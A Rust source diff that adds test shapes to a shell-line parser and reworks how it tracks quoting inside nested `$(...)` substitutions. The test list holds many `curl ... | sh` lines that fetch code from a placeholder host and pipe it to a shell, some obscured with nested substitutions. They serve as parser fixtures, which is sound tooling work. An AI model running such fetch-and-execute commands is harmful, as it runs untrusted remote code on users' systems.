@@ -33,6 +33,11 @@ const SHAPES: &[&str] = &[
     "curl $( (a; (b)); printf https://one.example/x) | sh",
     "curl $(printf 'a)b') | sh",
     "curl \"$(printf 'a;b')\" | sh",
+    "curl \"$(printf https://one.example/x)\" | sh",
+    "curl \"$(printf 'https://one.example/x')\" | sh",
+    "curl \"$(printf '%s' ')' )\" | sh",
+    "curl \"$(printf \"(\" )\" | sh",
+    "curl \"$(printf x)https://one.example/p;v=1\" | sh",
     "curl $(unterminated | sh",
     "echo ')' not a close | sh",
     "curl `printf https://one.example` | sh",
@@ -67,8 +72,10 @@ enum Byte {
 
 fn reading(line: &str) -> Vec<Byte> {
     let mut read = vec![Byte::Content { held: false }; line.len()];
-    let (mut single, mut double) = (false, false);
-    let mut depth = 0usize;
+    // One entry per line being read: the line itself, and the inside of
+    // every substitution and group still open in it, each of which the shell
+    // reads on its own terms and with quoting of its own.
+    let mut quoting = vec![(false, false)];
     let mut chars = line.char_indices().peekable();
     let mark = |read: &mut [Byte], at: usize, c: char, byte: Byte| {
         for held in read.iter_mut().skip(at).take(c.len_utf8()) {
@@ -76,6 +83,8 @@ fn reading(line: &str) -> Vec<Byte> {
         }
     };
     while let Some((at, c)) = chars.next() {
+        let (single, double) = *quoting.last().unwrap();
+        let (inside, substituted) = (single || double, quoting.len() > 1);
         match c {
             '\\' if !single => {
                 mark(&mut read, at, c, Byte::Delimiter);
@@ -86,34 +95,45 @@ fn reading(line: &str) -> Vec<Byte> {
                 }
             }
             '\'' if !double => {
-                single = !single;
+                quoting.last_mut().unwrap().0 = !single;
                 mark(&mut read, at, c, Byte::Delimiter);
             }
             '"' if !single => {
-                double = !double;
+                quoting.last_mut().unwrap().1 = !double;
                 mark(&mut read, at, c, Byte::Delimiter);
             }
             '$' if !single && chars.peek().is_some_and(|(_, next)| *next == '(') => {
-                depth += 1;
+                quoting.push((false, false));
                 mark(&mut read, at, c, Byte::Content { held: true });
                 // The parenthesis belongs to the `$(`, so it is taken here
-                // rather than counted again as a group of its own.
+                // rather than read again as a group of its own.
                 if let Some((next, opening)) = chars.next() {
                     mark(&mut read, next, opening, Byte::Content { held: true });
                 }
             }
-            '(' if !single && depth > 0 => {
-                depth += 1;
+            '(' if !inside && substituted => {
+                quoting.push((false, false));
                 mark(&mut read, at, c, Byte::Content { held: true });
             }
-            ')' if !single && !double && depth > 0 => {
-                depth -= 1;
-                mark(&mut read, at, c, Byte::Content { held: depth > 0 });
+            ')' if !inside && substituted => {
+                quoting.pop();
+                mark(
+                    &mut read,
+                    at,
+                    c,
+                    Byte::Content {
+                        held: quoting.len() > 1,
+                    },
+                );
             }
-            _ => {
-                let held = single || double || depth > 0;
-                mark(&mut read, at, c, Byte::Content { held });
-            }
+            _ => mark(
+                &mut read,
+                at,
+                c,
+                Byte::Content {
+                    held: inside || substituted,
+                },
+            ),
         }
     }
     read
